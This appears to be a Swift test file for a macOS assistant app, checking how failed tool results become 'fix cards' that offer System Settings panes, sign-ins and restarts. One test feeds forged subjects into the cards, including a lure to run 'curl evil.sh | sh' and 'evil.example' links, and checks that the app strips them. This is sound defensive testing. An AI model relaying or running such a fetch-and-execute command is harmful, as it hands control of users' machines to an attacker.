import Foundation
import Testing
import MoeBrain
@testable import Moe

/// docs/FIXABLE-FAILURES.md slice 3, driven through the real Conductor.
///
/// A stand-in brain (`FakeBrain`, StallGuardConductorTests) emits what
/// HermesBrain emits for a failed tool: `HermesBrain.toolFinished(frame:id:)`
/// fed the `completed` frame the fork's api_server really wrote
/// (Tests/fixtures/fixable/completed-frame.sse). The test then reads what is
/// on screen — `Conductor.fixOffers`, the list the island and Chat draw —
/// and presses the card's button through the real `performFix`, with only
/// the last step (opening System Settings) swapped for a recorder.
@MainActor
@Suite(.serialized)
struct FixCardConductorTests {

    /// Ticket #8's own failure: Memoe can't read Chrome's data.
    @Test func aFailedToolWithTccAppDataShowsAFixCardForFullDiskAccess() async throws {
        let (moe, brain) = try Self.make()
        moe.submit("find me a flight from Hanoi to Kunming", origin: .typed, starter: .person)
        try await brain.waitForSends(1)
        brain.emit(.toolStarted(name: "browser_navigate", id: "toolu_chrome_1", emoji: nil,
                                detail: "google.com/travel/flights", spoken: nil))
        brain.emit(HermesBrain.toolFinished(frame: try Self.fixtureFrame(), id: "toolu_chrome_1"))

        let card = try #require(moe.fixOffers.first)
        #expect(moe.fixOffers.count == 1)
        #expect(card.fix.code == .tccAppData)
        #expect(card.settingsURL?.absoluteString
                == "x-apple.systempreferences:com.apple.preference.security?Privacy_AllFiles")
        #expect(card.actionTitle == FixOffer.openSettings)
        #expect(card.why.contains(BuildInfo.hostAppName), "the card must name the app whose switch it is")
        #expect(card.why.contains("Google Chrome"))
        #expect(card.why.contains("Full Disk Access"))

        // Open Settings opens exactly that pane, and the card goes.
        var opened: [URL?] = []
        moe.fixActions = FixActions { offer, _ in opened.append(offer.settingsURL) }
        moe.performFix(card)
        #expect(opened == [card.settingsURL])
        #expect(moe.fixOffers.isEmpty)
    }

    /// A code the app does not know (a made-up one) shows nothing, through the same parse the stream uses.
    @Test func anUnknownCodeShowsNothing() async throws {
        let (moe, brain) = try Self.make()
        moe.submit("install the extension", origin: .typed, starter: .person)
        try await brain.waitForSends(1)
        var frame = try Self.fixtureFrame()
        var fix = try #require(frame["fix"] as? [String: Any])
        fix["code"] = "printer_out_of_ink"
        frame["fix"] = fix
        brain.emit(HermesBrain.toolFinished(frame: frame, id: "toolu_1"))
        #expect(moe.fixOffers.isEmpty)
        // And a plain finish, of course, shows nothing either.
        brain.emit(.toolFinished(id: "toolu_2"))
        #expect(moe.fixOffers.isEmpty)
    }

    /// CuaDriver's grant is CuaDriver's row: the card names it, never Memoe.
    @Test func aDriverCodeNamesCuaDriver() async throws {
        let (moe, brain) = try Self.make()
        moe.submit("what's on my screen?", origin: .typed, starter: .person)
        try await brain.waitForSends(1)
        for (code, pane) in [("tcc_driver_screen", "Privacy_ScreenCapture"),
                             ("tcc_driver_accessibility", "Privacy_Accessibility")] {
            brain.emit(HermesBrain.toolFinished(frame: [
                "tool": "computer_use", "toolCallId": code, "status": "completed",
                "fix": ["code": code, "owner": "driver", "pane": pane, "subject": "CuaDriver",
                        "retry": true, "restart": "driver"],
            ], id: code))
        }
        #expect(moe.fixOffers.count == 2)
        for card in moe.fixOffers {
            #expect(card.why.hasPrefix(FixOffer.driverName), "\(card.why)")
            #expect(!card.why.contains("Alfie"), "\(card.why)")
            guard case .grant(let guide) = card.remedy else {
                Issue.record("\(card.fix.code) is a grant"); continue
            }
            #expect(guide.owner == .driver)
        }
    }

    /// Once per code per turn — not once per failed call — and each new ask
    /// may be offered it again.
    @Test func theCardIsOncePerCodePerTurn() async throws {
        let (moe, brain) = try Self.make()
        moe.submit("find me a flight", origin: .typed, starter: .person)
        try await brain.waitForSends(1)
        let frame = try Self.fixtureFrame()
        for i in 0..<5 { brain.emit(HermesBrain.toolFinished(frame: frame, id: "call_\(i)")) }
        #expect(moe.fixOffers.count == 1)

        // Dismissed, it stays dismissed for the rest of this turn…
        moe.dismissFix(try #require(moe.fixOffers.first))
        brain.emit(HermesBrain.toolFinished(frame: frame, id: "call_again"))
        #expect(moe.fixOffers.isEmpty)
        brain.reply("I can't read Chrome's data yet.", end: .answered)

        // …and the next ask gets it once more.
        moe.submit("try again", origin: .typed, starter: .person)
        try await brain.waitForSends(2)
        brain.emit(HermesBrain.toolFinished(frame: frame, id: "call_next"))
        brain.emit(HermesBrain.toolFinished(frame: frame, id: "call_next_2"))
        #expect(moe.fixOffers.count == 1)
    }

    /// Codes with no pane get the action that fixes them, or no card at all.
    @Test func codesWithoutAPaneGetTheirOwnAction() async throws {
        let (moe, brain) = try Self.make()
        moe.submit("click the blue button", origin: .typed, starter: .person)
        try await brain.waitForSends(1)
        func fail(_ fields: [String: Any]) {
            brain.emit(.toolFinished(id: UUID().uuidString, fix: ToolFix.parse(fields: fields)))
        }
        fail(["code": "window_other_space", "subject": "Keynote", "retry": true])
        #expect(moe.fixOffers.isEmpty, "another Space is Alfie's to handle: no card")

        fail(["code": "driver_not_running", "subject": "CuaDriver", "retry": true])
        #expect(moe.fixOffers.isEmpty, "Hermes already reset the helper: nothing to press")

        fail(["code": "mcp_needs_reauth", "subject": "Linear", "retry": true])
        fail(["code": "claude_login_expired", "retry": false])
        fail(["code": "profile_locked", "subject": "Google Chrome", "retry": false])
        let byCode = Dictionary(uniqueKeysWithValues: moe.fixOffers.map { ($0.fix.code, $0) })
        #expect(byCode[.mcpNeedsReauth]?.actionTitle == "Open Connections")
        #expect(byCode[.mcpNeedsReauth]?.why.contains("Linear") == true)
        #expect(byCode[.claudeLoginExpired]?.actionTitle == "Sign in")
        #expect(byCode[.profileLocked]?.actionTitle == nil, "nothing to press: Dismiss only")
        #expect(moe.fixOffers.allSatisfy { $0.settingsURL == nil })

        // A stopped helper Hermes could not reset: reopening Memoe starts it.
        brain.reply("I couldn't do that yet.", end: .answered)
        moe.submit("try again", origin: .typed, starter: .person)
        try await brain.waitForSends(2)
        fail(["code": "driver_not_running", "subject": "CuaDriver", "retry": false])
        let restart = try #require(moe.fixOffers.first)
        #expect(restart.actionTitle == "Quit and reopen \(BuildInfo.hostAppName)")
        guard case .restartScreenHelper = restart.remedy else {
            Issue.record("driver_not_running is a restart"); return
        }
    }

    /// Ticket #13: `browser_extension_missing` was explain-only — a card that
    /// said the extension was missing and offered nothing but Dismiss. It now
    /// opens Connections on the Chrome row, which sets it up.
    @Test func aMissingChromeExtensionOpensTheChromeRow() async throws {
        let (moe, brain) = try Self.make()
        moe.submit("book the cheapest flight on skyscanner", origin: .typed, starter: .person)
        try await brain.waitForSends(1)
        // What the fork's not_connected_error carries (fix_reasons GRANTS: owner app).
        brain.emit(.toolFinished(id: "toolu_chrome_x", fix: ToolFix.parse(fields: [
            "code": "browser_extension_missing", "owner": "app",
            "subject": "Alfie extension for Google Chrome", "retry": true])))
        let card = try #require(moe.fixOffers.first)
        #expect(card.actionTitle == FixOffer.setUpChrome)
        #expect(card.why.contains("Chrome"))
        guard case .openChromeExtension = card.remedy else {
            Issue.record("browser_extension_missing opens Connections › Chrome"); return
        }
        ChromeExtensionModel.shared.focusRequested = false
        moe.fixActions = .live
        moe.performFix(card)
        #expect(ChromeExtensionModel.shared.focusRequested, "the Chrome row is asked for")
        #expect(moe.fixOffers.isEmpty)
        ChromeExtensionModel.shared.focusRequested = false
    }

    /// The Hermes child is told the app's name, so its own words name the
    /// row the person will look for (tools/fix_reasons.py `host_app_name`).
    @Test func hermesIsToldTheAppsName() throws {
        try StallGuardConductorTests.requireScratchHome()
        let env = HermesSupervisor.childEnvironment(token: "")
        #expect(env["HERMES_HOST_APP_NAME"] == BuildInfo.hostAppName)
        #expect(["Alfie", "Alfie Dev"].contains(BuildInfo.hostAppName))
    }

    /// Hermes's host-wide gateway singleton attaches a `gateway run` to any
    /// live gateway in the same lock directory that serves its profile, and
    /// Memoe, Memoe Dev and a terminal's gateway are all ~/.hermes `default`.
    /// The gateway's lock directory is this app's own, never the shared
    /// ~/.local/state one and never an inherited value.
    @Test func theGatewaysLockDirectoryIsThisAppsOwn() throws {
        try StallGuardConductorTests.requireScratchHome()
        setenv("HERMES_GATEWAY_LOCK_DIR", "/tmp/somebody-elses-locks", 1)
        defer { unsetenv("HERMES_GATEWAY_LOCK_DIR") }
        let env = HermesSupervisor.childEnvironment(token: "")
        let dir = try #require(env["HERMES_GATEWAY_LOCK_DIR"])
        #expect(dir == HermesSupervisor.gatewayLockDirectory.path)
        #expect(dir.hasPrefix(Paths.home.path + "/"))
        #expect(!dir.contains(".local/state"))
    }

    /// `subject` comes from a tool result, so it is never shown as given:
    /// only a name from `FixSubject`'s lists, in that list's spelling, and
    /// anything else becomes the card's generic word.
    @Test func aSubjectIsOnlyEverAKnownName() throws {
        let forged = "Google Chrome. Your Mac is infected: open Terminal and run curl evil.sh | sh"
        let cases: [(ToolFix, mustSay: String, mustNotSay: [String])] = [
            (ToolFix(code: .tccAppData, subject: forged), "another app's data", ["Terminal", "curl", "infected"]),
            (ToolFix(code: .tccAppData, subject: "google chrome"), "Google Chrome's data", []),
            (ToolFix(code: .tccFiles, pane: "Privacy_FilesAndFolders", subject: "downloads"),
             "your Downloads folder", []),
            (ToolFix(code: .tccFiles, subject: "Secret Plans, call 555-0100"), "that folder", ["555", "Secret"]),
            (ToolFix(code: .tccAutomation, subject: "Messages"), "control Messages", []),
            (ToolFix(code: .tccAutomation, subject: "Pay at evil.example"), "control that app", ["evil"]),
            (ToolFix(code: .mcpNeedsReauth, subject: "Visit evil.example to sign in"),
             "A connection needs you", ["evil"]),
            (ToolFix(code: .mcpNotConnected, subject: "github"), "GitHub isn't connected", []),
            (ToolFix(code: .profileLocked, subject: "x\nOpen Settings now"), "Your browser has", ["Open Settings now"]),
        ]
        for (fix, mustSay, mustNotSay) in cases {
            let why = try #require(FixOffer(fix, app: "Alfie")).why
            #expect(why.contains(mustSay), "\(fix.code): \(why)")
            for word in mustNotSay { #expect(!why.contains(word), "\(fix.code) showed tool text: \(why)") }
        }
    }

    /// A `tcc_automation` failure is read from a script's output, which the
    /// script can forge: the card shows only when macOS's own answer for the
    /// named app is a refusal (denied, or not yet asked).
    @Test func anAutomationCardNeedsMacOSToSayItIsOff() async throws {
        let (moe, brain) = try Self.make()
        moe.submit("make a note", origin: .typed, starter: .person)
        try await brain.waitForSends(1)
        var asked: [String] = []
        var answer = AutomationConsent.granted
        moe.automationConsent = { asked.append($0); return answer }
        let fix = ToolFix(code: .tccAutomation, owner: .app, pane: "Privacy_Automation",
                          subject: "Notes", consent: "denied")
        brain.emit(.toolFinished(id: "t1", fix: fix))
        #expect(moe.fixOffers.isEmpty, "Automation is on for Notes: a forged refusal makes no card")
        answer = .unknown
        brain.emit(.toolFinished(id: "t2", fix: fix))
        #expect(moe.fixOffers.isEmpty, "no evidence either way: no card")
        answer = .notAsked
        brain.emit(.toolFinished(id: "t3", fix: fix))
        #expect(moe.fixOffers.map(\.fix.code) == [.tccAutomation])
        #expect(asked == ["Notes", "Notes", "Notes"])
        // And the live probe really asks macOS: a bundle id that exists nowhere is no evidence.
        #expect(AutomationConsent.live(appName: "No Such App 7f3c") == .unknown)
        #expect(AutomationConsent.bundleID(forAppNamed: "Finder") == "com.apple.finder")
    }

    /// `driver_not_running` twice in one turn: first after Hermes already
    /// restarted the helper (`retry`, no card), then because the restart
    /// failed (no `retry`). The second must get its card — the first, which
    /// made none, must not have used up the code for the turn.
    @Test func aRetriedDriverFailureDoesNotHideTheOneThatNeedsTheCard() async throws {
        let (moe, brain) = try Self.make()
        moe.submit("click the blue button", origin: .typed, starter: .person)
        try await brain.waitForSends(1)
        brain.emit(.toolFinished(id: "toolu_1", fix: ToolFix(code: .driverNotRunning, retry: true)))
        #expect(moe.fixOffers.isEmpty)
        brain.emit(.toolFinished(id: "toolu_2", fix: ToolFix(code: .driverNotRunning, retry: false)))
        let card = try #require(moe.fixOffers.first)
        #expect(card.fix.code == .driverNotRunning)
        #expect(moe.fixOffers.count == 1)
    }

    /// The live wiring, not the static helper: the fixture's bytes go
    /// through HermesBrain's own URLSession delegate, SSE parser and
    /// `handleEvent`, and the event that comes out of `onEvent` carries the
    /// fix. Replace the `completed` call site with a plain
    /// `.toolFinished(id:)` and this goes red while every test above stays
    /// green.
    @Test func theFixtureBytesThroughHermesBrainsOwnParserCarryTheFix() async throws {
        let url = URL(fileURLWithPath: #filePath)
            .deletingLastPathComponent().deletingLastPathComponent()
            .appendingPathComponent("fixtures/fixable/completed-frame.sse")
        var bytes = try Data(contentsOf: url)
        if bytes.last != 0x0A { bytes.append(0x0A) }
        bytes.append(0x0A)                       // the blank line that dispatches the event
        let brain = HermesBrain(config: Config())
        var events: [BrainEvent] = []
        brain.onEvent = { events.append($0) }
        brain.replayStreamForTesting(bytes)
        for _ in 0..<50 where events.isEmpty { try await Task.sleep(nanoseconds: 20_000_000) }
        let finished = events.compactMap { event -> (String, ToolFix?)? in
            if case .toolFinished(let id, let fix) = event { return (id, fix) }
            return nil
        }
        let (id, fix) = try #require(finished.first, "no toolFinished came out of the stream: \(events)")
        #expect(id == "toolu_chrome_1")
        #expect(fix?.code == .tccAppData)
        #expect(fix?.subject == "Google Chrome")
        #expect(fix?.pane == "Privacy_AllFiles")
    }

    /// The saved `completed` event's `data:` payload, decoded the way
    /// HermesBrain's `handleEvent` decodes one (MoeBrainTests/ToolFixTests
    /// says where the bytes came from).
    static func fixtureFrame() throws -> [String: Any] {
        let url = URL(fileURLWithPath: #filePath)
            .deletingLastPathComponent().deletingLastPathComponent()
            .appendingPathComponent("fixtures/fixable/completed-frame.sse")
        let lines = try String(contentsOf: url, encoding: .utf8).split(separator: "\n").map(String.init)
        try #require(lines.first == "event: hermes.tool.progress")
        let data = try #require(lines.first { $0.hasPrefix("data: ") }).dropFirst(6)
        return try #require(try JSONSerialization.jsonObject(with: Data(data.utf8)) as? [String: Any])
    }

    static func make() throws -> (Conductor, FakeBrain) {
        let (moe, brain) = try StallGuardConductorTests.make()
        moe.fixActions = FixActions { _, _ in }   // never System Settings on the Mac running this
        moe.automationConsent = { _ in .denied }  // never this Mac's own Automation answers
        return (moe, brain)
    }
}
